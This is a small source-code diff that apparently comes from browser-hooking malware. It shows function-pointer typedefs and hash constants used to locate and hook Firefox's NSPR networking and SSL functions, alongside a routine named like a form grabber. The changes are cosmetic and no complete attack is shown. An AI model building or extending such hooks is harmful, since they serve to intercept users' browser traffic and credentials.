@@ -179,7 +179,7 @@ void FFBG_Template(REQUEST Request, DATA Data, STR_ Str, ARG1 Arg, ARG2 Arg2)
 //char HeaderContentLength[] = {'c','o','n','t','e','n','t','-','l','e','n','g','t','h',':',' ',0};
 
 
-typedef PRInt32 (*PWRITE)( PRFileDesc *fd,const void *buf,PRInt32 amount ); 
+typedef PRInt32 (*PWRITE)(PRFileDesc *fd,const void *buf,PRInt32 amounts); 
 typedef PRInt32 (*PREAD)(PRFileDesc *fd, void *buf, PRInt32 amount);
 typedef PRStatus (*PCLOSE)( PRFileDesc *fd );
 typedef PRStatus (*PCONNECT)( PRFileDesc *fd, const PRNetAddr *addr, PRIntervalTime timeout );
@@ -1065,7 +1065,7 @@ bool NSPRHOOKS::HookNSPRApi()
 
 	DWORD PR_OpenTCPSocketHash = 0x54030857;
 	DWORD PR_WriteHash	   = 0x7EFB3098;
-	DWORD PR_ReadHash	   = 0xFA583271;
+	DWORD PR_ReadHash	   = 0xFA583271; 
 	DWORD PR_CloseHash	   = 0x3D3AB319;
 	DWORD PR_ConnectHash   = 0xBF667EA2;
 	DWORD SSL_ImportFDHash = 0xA1C4E024;
